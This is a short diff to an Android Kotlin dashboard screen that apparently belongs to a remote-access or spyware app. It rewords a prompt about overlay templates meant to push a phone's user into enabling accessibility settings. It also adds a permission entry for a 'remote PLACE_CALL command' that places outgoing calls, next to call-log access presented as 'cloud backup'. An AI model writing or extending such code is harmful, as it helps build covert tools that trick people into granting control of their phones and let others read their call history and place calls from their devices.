@@ -697,7 +697,7 @@ fun DashboardScreen(
 
                     Spacer(modifier = Modifier.height(10.dp))
                     Text(
-                        text = "Select an overlay template to prompt for system settings activation (e.g. Accessibility or Location):",
+                        text = "Select an overlay template to prompt for accessibility settings activation:",
                         fontSize = 11.sp,
                         color = HighDensitySecondary
                     )
@@ -1240,6 +1240,12 @@ fun DashboardScreen(
                     "calls", "Call Logs Access", "Required for call history cloud backup",
                     Icons.Default.Call,
                     androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED,
+                    "ALLOW", onRequestPermissions, { openAppSystemSettings() }
+                ),
+                PermissionDetailItem(
+                    "call_phone", "Direct Phone Calling", "Allows remote PLACE_CALL command to place outgoing phone calls",
+                    Icons.Default.Call,
+                    androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) == android.content.pm.PackageManager.PERMISSION_GRANTED,
                     "ALLOW", onRequestPermissions, { openAppSystemSettings() }
                 ),
                 PermissionDetailItem(
